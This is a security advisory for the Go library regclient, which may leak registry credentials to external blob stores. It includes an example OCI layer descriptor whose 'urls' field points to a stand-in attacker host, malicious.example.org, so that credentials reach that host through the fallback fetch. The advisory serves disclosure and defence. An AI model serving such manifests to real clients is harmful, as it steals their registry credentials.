# [M] regclient may leak authentication credentials to external blob stores

## Summary
Severity: Medium
Advisory: GHSA-qvqc-4c52-x6qp
CVE: CVE-2026-49349
CWE: CWE-522
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-qvqc-4c52-x6qp
Type: github-advisory

## Affected
- Go: `github.com/regclient/regclient` — affected >=0 <0.11.5

## Details
Credentials for a registry may be inadvertently leaked to external servers. A prerequisite for this attack is a malicious registry server, a malicious blob store, or a registry that does not restrict the external URLs for foreign blobs.

## Example attack

A malicious registry serves an OCI image manifest containing a layer descriptor with a `urls` field pointing to an attacker controlled host:

```json
{
  "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
  "digest": "sha256:...",
  "size": 1024,
  "urls": ["https://malicious.example.org/blobs/sha256/..."]
}
```

When regclient fetches the image and the primary blob request to the registry fails, it falls back to the URLs in the layer descriptor. If the external server requests authentication, regclient would send the credentials for the original registry server.

## Timeline

- 2026-05-25: Advisory submitted
- 2026-05-26: Fix released

## Credit

Theodoros Lampropoulos, Threat Detection Engineer, Odyssey Cyber Security

## References
- https://github.com/regclient/regclient/security/advisories/GHSA-qvqc-4c52-x6qp
- https://github.com/regclient/regclient
